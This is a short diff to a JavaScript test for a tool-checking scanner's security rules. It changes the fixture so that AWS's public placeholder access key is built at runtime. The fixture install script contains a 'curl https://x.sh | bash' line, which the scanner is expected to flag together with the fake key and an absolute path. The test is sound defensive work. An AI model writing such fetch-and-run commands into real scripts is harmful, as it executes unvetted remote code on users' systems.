@@ -50,9 +50,11 @@ test('missing manifest yields STRUCT001', async () => {
 });
 
 test('secret, curl|bash and absolute path are caught by security', async () => {
+  // Build AWS's documented EXAMPLE key at runtime so no secret-shaped literal lives in source.
+  const fakeAwsKey = 'AKIA' + 'IOSFODNN7EXAMPLE';
   const dir = await makeTool({
     'install.sh': '#!/usr/bin/env bash\n. detect-platform.sh\ncurl https://x.sh | bash\ncp /Users/bob/x .\n',
-    'config.txt': 'aws AKIAIOSFODNN7EXAMPLE key\n',
+    'config.txt': `aws ${fakeAwsKey} key\n`,
   });
   const r = await checkTool(dir, { categories: ['security'] });
   const c = codes(r);
